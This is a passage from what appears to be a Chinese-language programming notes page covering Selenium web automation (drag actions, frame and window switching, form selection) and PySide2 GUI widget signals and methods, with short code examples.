<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains	<span class="comment">#导入类</span></span><br><span class="line">action = ActionChains(bro)	<span class="comment">#初始化类，bro为浏览器对象</span></span><br><span class="line">action.click_and_hold(div)	<span class="comment">#点击并拖住，div为查找的一个元素</span></span><br><span class="line">action.move_by_offset(x,y).perform()	<span class="comment">#移动x,y像素，perform立即执行</span></span><br><span class="line"></span><br><span class="line">action.release()	<span class="comment"># 释放动作链</span></span><br></pre></td></tr></table></figure>
<h3 id="frame切换-窗口切换">frame切换/窗口切换<a class="header-anchor" href="#frame切换-窗口切换"> ¶ </a></h3>
<ul>
<li>
<p>需要定位iframe标签内部标签（子页面）</p>
<ul>
<li>
<p>需要先切换到子页面</p>
</li>
<li>
<pre><code class="language-python">bro.switch_to.frame([id])	#先切换作用域再定位
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 切换回主页面</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    wd.switch_to.default_content()</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
<li>
<p>切换到新窗口</p>
<ul>
<li>
<pre><code class="language-python">for handle in wd.window_handles:
    # 先切换到该窗口
    wd.switch_to.window(handle)
    # 得到该窗口的标题栏字符串，判断是不是我们要操作的那个窗口
    if '窗口标题字符串' in wd.title:
        # 如果是，那么这时候WebDriver对象就是对应的该该窗口，正好，跳出循环，
        break
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 切换回旧窗口：先保存旧窗口句柄，然后再切换</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    # mainWindow变量保存当前窗口的句柄</span><br><span class="line">    mainWindow = wd.current_window_handle</span><br><span class="line">    #通过前面保存的老窗口的句柄，自己切换到老窗口</span><br><span class="line">    wd.switch_to.window(mainWindow)</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
</ul>
<h3 id="选择框">选择框<a class="header-anchor" href="#选择框"> ¶ </a></h3>
<h4 id="radio-单选框">radio 单选框<a class="header-anchor" href="#radio-单选框"> ¶ </a></h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;s_radio&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小江老师&quot;</span>&gt;</span>小江老师<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小雷老师&quot;</span>&gt;</span>小雷老师<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小凯老师&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span>&gt;</span>小凯老师</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取当前选中的元素</span></span><br><span class="line">element = wd.find_element_by_css_selector(</span><br><span class="line">  <span class="string">&#x27;#s_radio input[checked=checked]&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;当前选中的是: &#x27;</span> + element.get_attribute(<span class="string">&#x27;value&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点选 小雷老师</span></span><br><span class="line">wd.find_element_by_css_selector(</span><br><span class="line">  <span class="string">&#x27;#s_radio input[value=&quot;小雷老师&quot;]&#x27;</span>).click()</span><br></pre></td></tr></table></figure>
<h4 id="checkbox-复选框">checkbox 复选框<a class="header-anchor" href="#checkbox-复选框"> ¶ </a></h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;s_checkbox&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小江老师&quot;</span>&gt;</span>小江老师<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小雷老师&quot;</span>&gt;</span>小雷老师<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小凯老师&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span>&gt;</span>小凯老师</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先把 已经选中的选项全部点击一下</span></span><br><span class="line">elements = wd.find_elements_by_css_selector(</span><br><span class="line">  <span class="string">&#x27;#s_checkbox input[checked=&quot;checked&quot;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">    element.click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再点击 小雷老师</span></span><br><span class="line">wd.find_element_by_css_selector(</span><br><span class="line">  <span class="string">&quot;#s_checkbox input[value=&#x27;小雷老师&#x27;]&quot;</span>).click()</span><br></pre></td></tr></table></figure>
<h4 id="select">select<a class="header-anchor" href="#select"> ¶ </a></h4>
<ul>
<li>
<p><code>select_by_value</code>：根据选项的 <strong>value属性值</strong>，选择元素。</p>
<ul>
<li>
<pre><code class="language-python"># &lt;option value=&quot;foo&quot;&gt;Bar&lt;/option&gt;

s.select_by_value('foo')
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `select_by_index`：根据选项的 **次序**（从0开始），选择元素</span><br><span class="line"></span><br><span class="line">- `select_by_visible_text`：根据选项的 **可见文本**，选择元素</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    # &lt;option value=&quot;foo&quot;&gt;Bar&lt;/option&gt;</span><br><span class="line">    </span><br><span class="line">    s.select_by_visible_text(&#x27;Bar&#x27;)</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
<li>
<p><code>deselect_by_value</code> ：根据选项的value属性值， <strong>去除</strong>选中元素</p>
</li>
<li>
<p><code>deselect_by_index</code> ：根据选项的次序，去除选中元素</p>
</li>
<li>
<p><code>deselect_by_visible_text</code> ：根据选项的可见文本，去除选中元素</p>
</li>
<li>
<p><code>deselect_all</code> ：去除选中所有元素</p>
</li>
</ul>
<h5 id="select-单选下拉框">select 单选下拉框<a class="header-anchor" href="#select-单选下拉框"> ¶ </a></h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入Select类</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Select对象</span></span><br><span class="line">select = Select(wd.find_element_by_id(<span class="string">&quot;ss_single&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 Select 对象选中小雷老师</span></span><br><span class="line">select.select_by_visible_text(<span class="string">&quot;小雷老师&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="select-多选框">select 多选框<a class="header-anchor" href="#select-多选框"> ¶ </a></h5>
<p>多选框同</p>
<h2 id="图形界面">图形界面<a class="header-anchor" href="#图形界面"> ¶ </a></h2>
<h3 id="pyside2">pyside2<a class="header-anchor" href="#pyside2"> ¶ </a></h3>
<h4 id="安装-3">安装<a class="header-anchor" href="#安装-3"> ¶ </a></h4>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python -m pip install pyside2</span><br></pre></td></tr></table></figure>
<h4 id="控件">控件<a class="header-anchor" href="#控件"> ¶ </a></h4>
<h5 id="按钮">按钮<a class="header-anchor" href="#按钮"> ¶ </a></h5>
<p><code>QPushButton</code> 就是常见的按钮</p>
<h6 id="信号：被点击">信号：被点击<a class="header-anchor" href="#信号：被点击"> ¶ </a></h6>
<p>当按钮被点击就会发出 <code>clicked</code> 信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">button.clicked.connect(handleCalc)</span><br></pre></td></tr></table></figure>
<h6 id="方法：改变文本">方法：改变文本<a class="header-anchor" href="#方法：改变文本"> ¶ </a></h6>
<p>代码中可以使用 <code>setText</code> 方法来改变按钮文本，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">button.setText(text)</span><br></pre></td></tr></table></figure>
<h6 id="方法：禁用、启用">方法：禁用、启用<a class="header-anchor" href="#方法：禁用、启用"> ¶ </a></h6>
<p>所有控件（继承自QWidget类）都支持 禁用和启用方法。</p>
<p>禁用后，该控件不再处理用户操作</p>
<ul>
<li>禁用</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">button.setEnabled(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>启用</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">button.setEnabled(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h5 id="单行文本框">单行文本框<a class="header-anchor" href="#单行文本框"> ¶ </a></h5>
<p><code>QLineEdit</code> 是只能单行编辑的文本框。</p>
<h6 id="信号：文本被修改">信号：文本被修改<a class="header-anchor" href="#信号：文本被修改"> ¶ </a></h6>
<p>当文本框中的内容被键盘编辑，被点击就会发出 <code>textChanged </code>信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.textChanged.connect(handleTextChange)</span><br></pre></td></tr></table></figure>
<h6 id="信号：按下回车键">信号：按下回车键<a class="header-anchor" href="#信号：按下回车键"> ¶ </a></h6>
<p>当用户在文本框中任何时候按下回车键，就会发出 <code>returnPressed</code> 信号。</p>
<p>有时我们需要处理这种情况，比如登录界面，用户输完密码直接按回车键就进行登录处理，比再用鼠标点击登录按钮快捷的多。</p>
<p>可以指定处理 returnPressed 信号，如下所示</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">passwordEdit.returnPressed.connect(onLogin)</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取文本">方法：获取文本<a class="header-anchor" href="#方法：获取文本"> ¶ </a></h6>
<p>通过 <code>text</code> 方法获取编辑框内的文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">text = edit.text()</span><br></pre></td></tr></table></figure>
<h6 id="方法：设置提示">方法：设置提示<a class="header-anchor" href="#方法：设置提示"> ¶ </a></h6>
<p>通过 <code>setPlaceholderText</code> 方法可以设置提示文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.setPlaceholderText(<span class="string">&#x27;请在这里输入URL&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h6 id="方法：设置文本">方法：设置文本<a class="header-anchor" href="#方法：设置文本"> ¶ </a></h6>
<p>通过 <code>setText</code> 方法设置编辑框内的文本内容为参数里面的文本字符串，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.setText(<span class="string">&#x27;你好，白月黑羽&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>原来的所有内容会被清除</p>
<h6 id="方法：清除所有文本">方法：清除所有文本<a class="header-anchor" href="#方法：清除所有文本"> ¶ </a></h6>
<p><code>clear</code> 方法可以清除编辑框内所有的文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.clear()</span><br></pre></td></tr></table></figure>
<h6 id="方法：拷贝文本到剪贴板">方法：拷贝文本到剪贴板<a class="header-anchor" href="#方法：拷贝文本到剪贴板"> ¶ </a></h6>
<p><code>copy</code> 方法可以拷贝当前选中文本到剪贴板，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.copy()</span><br></pre></td></tr></table></figure>
<h6 id="方法：粘贴剪贴板文本">方法：粘贴剪贴板文本<a class="header-anchor" href="#方法：粘贴剪贴板文本"> ¶ </a></h6>
<p><code>paste</code> 方法可以把剪贴板内容，拷贝到编辑框当前光标所在处，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.paste()</span><br></pre></td></tr></table></figure>
<h5 id="多行纯文本框">多行纯文本框<a class="header-anchor" href="#多行纯文本框"> ¶ </a></h5>
<p><code>QPlainTextEdit</code> 是可以 <code>多行</code> 的纯文本编辑框。</p>
<h6 id="信号：文本被修改-2">信号：文本被修改<a class="header-anchor" href="#信号：文本被修改-2"> ¶ </a></h6>
<p>当文本框中的内容被键盘编辑，被点击就会发出 <code>textChanged </code>信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.textChanged.connect(handleTextChange)</span><br></pre></td></tr></table></figure>
<h6 id="信号：光标位置改变">信号：光标位置改变<a class="header-anchor" href="#信号：光标位置改变"> ¶ </a></h6>
<p>当文本框中的光标位置变动，就会发出 <code>cursorPositionChanged</code> 信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.cursorPositionChanged.connect(handleChanged)</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取文本-2">方法：获取文本<a class="header-anchor" href="#方法：获取文本-2"> ¶ </a></h6>
<p>通过 <code>toPlainText</code> 方法获取编辑框内的文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">text = edit.toPlainText()</span><br></pre></td></tr></table></figure>
<h6 id="获取选中文本">获取选中文本<a class="header-anchor" href="#获取选中文本"> ¶ </a></h6>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### 获取 QTextCursor 对象</span></span><br><span class="line">textCursor = edit.textCursor()</span><br><span class="line">selection = textCursor.selectedText()</span><br></pre></td></tr></table></figure>
<h6 id="方法：设置提示-2">方法：设置提示<a class="header-anchor" href="#方法：设置提示-2"> ¶ </a></h6>
<p>通过 <code>setPlaceholderText</code> 方法可以设置提示文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.setPlaceholderText(<span class="string">&#x27;请在这里输入薪资表&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h6 id="方法：设置文本-2">方法：设置文本<a class="header-anchor" href="#方法：设置文本-2"> ¶ </a></h6>
<p>通过 <code>setPlainText</code> 方法设置编辑框内的文本内容 为参数里面的文本字符串，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.setPlainText(<span class="string">&#x27;&#x27;&#x27;你好，白月黑羽</span></span><br><span class="line"><span class="string">hello byhy&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>原来的所有内容会被清除</p>
<h6 id="方法：在末尾添加文本">方法：在末尾添加文本<a class="header-anchor" href="#方法：在末尾添加文本"> ¶ </a></h6>
<p>通过 <code>appendPlainText</code> 方法在编辑框末尾添加文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.appendPlainText(<span class="string">&#x27;你好，白月黑羽&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意：这种方法会在添加文本后 <code>自动换行</code></p>
<h6 id="方法：在光标处插入文本">方法：在光标处插入文本<a class="header-anchor" href="#方法：在光标处插入文本"> ¶ </a></h6>
<p>通过 <code>insertPlainText</code> 方法在编辑框末尾添加文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.insertPlainText(<span class="string">&#x27;你好，白月黑羽&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意：这种方法 <code>不会</code> 在添加文本后自动换行</p>
<h6 id="方法：清除所有文本-2">方法：清除所有文本<a class="header-anchor" href="#方法：清除所有文本-2"> ¶ </a></h6>
<p><code>clear</code> 方法可以清除编辑框内所有的文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.clear()</span><br></pre></td></tr></table></figure>
<h6 id="方法：拷贝文本到剪贴板-2">方法：拷贝文本到剪贴板<a class="header-anchor" href="#方法：拷贝文本到剪贴板-2"> ¶ </a></h6>
<p><code>copy</code> 方法可以清除编辑框内所有的文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.copy()</span><br></pre></td></tr></table></figure>
<h6 id="方法：粘贴剪贴板文本-2">方法：粘贴剪贴板文本<a class="header-anchor" href="#方法：粘贴剪贴板文本-2"> ¶ </a></h6>
<p><code>paste</code> 方法可以把剪贴板内容，拷贝到编辑框当前光标所在处，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.paste()</span><br></pre></td></tr></table></figure>
<h5 id="文本浏览框">文本浏览框<a class="header-anchor" href="#文本浏览框"> ¶ </a></h5>
<p><code>QTextBrowser</code> 是 <code>只能查看文本</code> 控件。</p>
<p>通常用来显示一些操作日志信息、或者不需要用户编辑的大段文本内容。</p>
<p><a href="https://doc.qt.io/qtforpython-5.12/PySide2/QtWidgets/QTextBrowser.html">官网介绍</a></p>
<p>该控件 获取文本、设置文本、清除文本、剪贴板复制粘贴 等等， 都和上面介绍的 多行纯文本框是一样的。</p>
<p>下面我们主要讲解不同点</p>
<h6 id="方法：在末尾添加文本-2">方法：在末尾添加文本<a class="header-anchor" href="#方法：在末尾添加文本-2"> ¶ </a></h6>
<p>通过 <code>append</code> 方法在编辑框末尾添加文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">textBrowser.append(<span class="string">&#x27;你好，白月黑羽&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>有时，浏览框里面的内容长度超出了可见范围，我们在末尾添加了内容，往往希望控件自动翻滚到当前添加的这行，</p>
<p>可以通过 <code>ensureCursorVisible</code> 方法来实现</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">textBrowser.append(<span class="string">&#x27;你好，白月黑羽&#x27;</span>)</span><br><span class="line">textBrowser.ensureCursorVisible()</span><br></pre></td></tr></table></figure>
<p>注意：这种方法会在添加文本后 <code>自动换行</code></p>
<h6 id="方法：在光标处插入文本-2">方法：在光标处插入文本<a class="header-anchor" href="#方法：在光标处插入文本-2"> ¶ </a></h6>
<p>通过 <code>insertPlainText</code> 方法在编辑框末尾添加文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit.insertPlainText(<span class="string">&#x27;你好，白月黑羽&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意：这种方法 <code>不会</code> 在添加文本后自动换行</p>
<h5 id="文本标签">文本标签<a class="header-anchor" href="#文本标签"> ¶ </a></h5>
<p><code>QLabel</code> 就是常见的标签</p>
<h6 id="方法：改变文本-2">方法：改变文本<a class="header-anchor" href="#方法：改变文本-2"> ¶ </a></h6>
<p>代码中可以使用 <code>setText</code> 方法来改变标签文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">button.setText(text)</span><br></pre></td></tr></table></figure>
<h6 id="显示图片">显示图片<a class="header-anchor" href="#显示图片"> ¶ </a></h6>
<p>QLabel可以用来显示图片，有时一个图片可以让界面好看很多</p>
<p>怎么用QLabel 显示图片呢？</p>
<p>可以在 Qt Designer上 属性编辑器 QLabel 栏 的 pixmap 属性设置中选择图片文件指定。</p>
<h5 id="组合选择框">组合选择框<a class="header-anchor" href="#组合选择框"> ¶ </a></h5>
<p><code>QComboBox</code> 是组合选择框</p>
<h6 id="信号：选项改变">信号：选项改变<a class="header-anchor" href="#信号：选项改变"> ¶ </a></h6>
<p>如果用户操作修改了QComboBox中的选项就会发出 <code>currentIndexChanged </code>信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cbox.currentIndexChanged.connect(handleSelectionChange)</span><br></pre></td></tr></table></figure>
<h6 id="方法：添加一个选项">方法：添加一个选项<a class="header-anchor" href="#方法：添加一个选项"> ¶ </a></h6>
<p>代码中可以使用 <code>addItem</code> 方法来添加一个选项到 <code>末尾</code> ，参数就是选项文本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cbox.addItem(<span class="string">&#x27;byhy&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h6 id="方法：添加多个选项">方法：添加多个选项<a class="header-anchor" href="#方法：添加多个选项"> ¶ </a></h6>
<p>代码中可以使用 <code>addItems</code> 方法来添加多个选项到 <code>末尾</code>，参数是包含了多个选项文本的列表</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cbox.addItems([<span class="string">&#x27;byhy&#x27;</span>,<span class="string">&#x27;白月黑羽&#x27;</span>,<span class="string">&#x27;python教程&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h6 id="方法：清空选项">方法：清空选项<a class="header-anchor" href="#方法：清空选项"> ¶ </a></h6>
<p>代码中可以使用 <code>clear</code> 方法来清空选项，也就是删除选择框内所有的选项</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cbox.clear()</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取当前选项文本">方法：获取当前选项文本<a class="header-anchor" href="#方法：获取当前选项文本"> ¶ </a></h6>
<p>代码中可以使用 <code>currentText</code> 方法来获取当前 <code>选中的选项</code> 的文本，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">method = cbox.currentText()</span><br></pre></td></tr></table></figure>
<h5 id="列表-2">列表<a class="header-anchor" href="#列表-2"> ¶ </a></h5>
<p><code>QListWidget</code> 是列表控件</p>
<h6 id="方法：添加一个选项-2">方法：添加一个选项<a class="header-anchor" href="#方法：添加一个选项-2"> ¶ </a></h6>
<p>代码中可以使用 <code>addItem</code> 方法来添加一个选项到 <code>末尾</code> ，参数就是选项文本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">listWidget.addItem(<span class="string">&#x27;byhy&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h6 id="方法：添加多个选项-2">方法：添加多个选项<a class="header-anchor" href="#方法：添加多个选项-2"> ¶ </a></h6>
<p>代码中可以使用 <code>addItems</code> 方法来添加多个选项到 <code>末尾</code>，参数是包含了多个选项文本的列表</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">listWidget.addItems([<span class="string">&#x27;byhy&#x27;</span>,<span class="string">&#x27;白月黑羽&#x27;</span>,<span class="string">&#x27;python教程&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h6 id="方法：删除一个选项">方法：删除一个选项<a class="header-anchor" href="#方法：删除一个选项"> ¶ </a></h6>
<p>代码中可以使用 <code>takeItem</code> 方法来删除1个选项，参数是该选项所在行</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">listWidget.takeItem(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>就会删除第二行选项</p>
<h6 id="方法：清空选项-2">方法：清空选项<a class="header-anchor" href="#方法：清空选项-2"> ¶ </a></h6>
<p>代码中可以使用 <code>clear</code> 方法来清空选项，也就是删除选择框内所有的选项</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">listWidget.clear()</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取当前选项文本-2">方法：获取当前选项文本<a class="header-anchor" href="#方法：获取当前选项文本-2"> ¶ </a></h6>
<p><code>currentItem</code> 方法可以得到列表当前选中项对象（QListWidgetItem） ，再调用这个对象的 <code>text</code> 方法，就可以获取文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">listWidget.currentItem().text()</span><br></pre></td></tr></table></figure>
<p>就获取了 <code>第1行，第1列</code> 的单元格里面的文本。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">listWidget.currentItem().text()</span><br></pre></td></tr></table></figure>
<h5 id="表格">表格<a class="header-anchor" href="#表格"> ¶ </a></h5>
<p><code>QTableWidget</code> 是表格控件</p>
<h6 id="创建列-和-标题栏">创建列 和 标题栏<a class="header-anchor" href="#创建列-和-标题栏"> ¶ </a></h6>
<p>我们可以通过 Qt designer 为一个表格创建列和对应的标题栏。</p>
<p>只需要双击 Qt designer 设计的窗体中的 表格控件， 就会出现这样的对话框。</p>
<p>在 <code>列</code> 标签栏中，点击左下角的加号，就可以为 添加一个列，并且设置标题栏名称。</p>
<h6 id="方法：设置表格行数">方法：设置表格行数<a class="header-anchor" href="#方法：设置表格行数"> ¶ </a></h6>
<p>代码中可以使用 <code>setRowCount</code> 方法来设置表格行数，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.setRowCount(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取所有行数">方法：获取所有行数<a class="header-anchor" href="#方法：获取所有行数"> ¶ </a></h6>
<p>代码中可以使用 <code>rowCount</code> 方法来获取表格所有的函数，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rowcount = table.rowCount()</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取当前选中是第几行">方法：获取当前选中是第几行<a class="header-anchor" href="#方法：获取当前选中是第几行"> ¶ </a></h6>
<p>代码中可以使用 <code>currentRow</code> 方法来获取当前选中是第几行，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">currentrow = table.currentRow()</span><br></pre></td></tr></table></figure>
<p>注意：行数是从0开始的， 第一行的行数是 0</p>
<h6 id="方法：插入一行、删除一行">方法：插入一行、删除一行<a class="header-anchor" href="#方法：插入一行、删除一行"> ¶ </a></h6>
<p><code>insertRow</code> 方法可以在指定位置插入一行，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.insertRow(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>就插入一行到第 <code>1</code> 行这个位置， 表格原来第1行（包括原来的第1行）以后的内容，全部往下移动一行。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.insertRow(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>就插入一行到第 <code>3</code> 行这个位置， 表格原来第3行（包括原来的第3行）以后的内容，全部往下移动一行。</p>
<p><code>removeRow</code> 方法可以删除指定位置的一行，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.removeRow(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>就删除第 <code>1</code> 行， 表格原来第1行以后的内容，全部往上移动一行。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.removeRow(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>就删除第 <code>3</code> 行， 表格原来第3行以后的内容，全部往上移动一行。</p>
<h6 id="方法：清除-删除所有内容">方法：清除/删除所有内容<a class="header-anchor" href="#方法：清除-删除所有内容"> ¶ </a></h6>
<p><code>clearContents</code> 方法可以清除表格所有的内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.clearContents()</span><br></pre></td></tr></table></figure>
<p>清除后，仍然会留下表格栏</p>
<p>如果连表格栏都要删除，可以加上 <code>setRowCount(0)</code>，像这样</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.clearContents()</span><br><span class="line">table.setRowCount(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h6 id="方法：获取单元格文本的内容">方法：获取单元格文本的内容<a class="header-anchor" href="#方法：获取单元格文本的内容"> ¶ </a></h6>
<p><code>item</code> 方法可以指定位置的单元格对象（QTableWidgetItem） ，再调用这个对象的 <code>text</code> 方法，就可以获取文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.item(<span class="number">0</span>,<span class="number">0</span>).text()</span><br></pre></td></tr></table></figure>
<p>就获取了 <code>第1行，第1列</code> 的单元格里面的文本。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.item(<span class="number">2</span>,<span class="number">4</span>).text()</span><br></pre></td></tr></table></figure>
<p>就获取了 <code>第3行，第5列</code> 的单元格里面的文本。</p>
<h6 id="方法：设置单元格文本内容">方法：设置单元格文本内容<a class="header-anchor" href="#方法：设置单元格文本内容"> ¶ </a></h6>
<p>qt表格的单元格内的内容对象 是一个 单元格对象 <code>QTableWidgetItem</code> 实例</p>
<p>如果单元格 <code>没有被设置过</code> 内容，可以这样</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QTableWidgetItem</span><br><span class="line"></span><br><span class="line">item = QTableWidgetItem()</span><br><span class="line">item.setText(<span class="string">&#x27;白月黑羽&#x27;</span>)</span><br><span class="line">table.setItem(row, <span class="number">0</span>, item)</span><br></pre></td></tr></table></figure>
<p>也可以简写为</p>
